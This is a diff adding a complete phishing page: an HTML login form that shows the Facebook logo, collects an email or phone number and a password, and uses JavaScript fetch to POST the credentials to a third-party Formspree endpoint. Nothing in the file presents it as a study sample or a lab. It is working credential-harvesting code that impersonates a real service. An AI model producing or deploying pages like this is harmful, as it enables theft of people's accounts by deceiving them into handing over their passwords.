@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="form-container">
+        <!-- Replace this with your logo -->
+        <div class="logo">
+            <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
+        </div>
+
+        <div class="email">
+            <label for="email">Email or Phone</label>
+            <div class="sec-2">
+                <ion-icon name="mail-outline"></ion-icon>
+                <input type="text" id="email" name="email" placeholder="Enter Email Or Phone Number">
+            </div>
+        </div>
+
+        <div class="fullname">
+            <label for="fullname">Password</label>
+            <div class="sec-2">
+                <ion-icon name="person-outline"></ion-icon>
+                <input type="password" id="password" name="password" placeholder="Enter Your Password">
+            </div>
+        </div>
+
+        <button class="send" onclick="sendFormData()">Login</button>
+
+        <script>
+            function sendFormData() {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+
+                // Check if email and password are not empty before sending
+                if (email && password) {
+                    const formData = new FormData();
+                    formData.append('email', email);
+                    formData.append('password', password);
+
+                    fetch('https://formspree.io/f/myyrzggd', {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            // Handle success, e.g., show a success message
+                            console.log(data);
+                        })
+                        .catch(error => {
+                            // Handle error, e.g., show an error message
+                            console.error(error);
+                        });
+                }
+            }
+        </script>
+    </div>
+</body>
+
+</html>
